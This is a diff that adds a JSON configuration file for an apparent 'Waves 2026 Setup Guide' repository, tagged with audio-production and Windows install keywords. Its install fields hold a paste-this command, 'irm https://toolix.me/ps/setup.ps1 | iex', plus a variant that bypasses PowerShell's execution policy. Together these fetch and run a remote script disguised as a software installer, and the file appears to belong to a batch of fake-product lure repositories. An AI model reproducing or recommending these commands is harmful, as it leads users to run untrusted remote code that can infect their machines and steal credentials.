@@ -1,0 +1,28 @@
+{
+  "repo": "Waves-2026-Setup-Guide",
+  "product": "Waves 2026 Setup Guide",
+  "product_title": "Waves 2026 Setup Guide",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "audio",
+  "topics": [
+    "how-to-install-waves-guide",
+    "waves-guide-app",
+    "daw-plugin",
+    "mixing-tools",
+    "audio-editing",
+    "music-production",
+    "waves-guide-audio-tool",
+    "waves-guide-music-production",
+    "waves-guide",
+    "waves-guide-desktop-2026",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
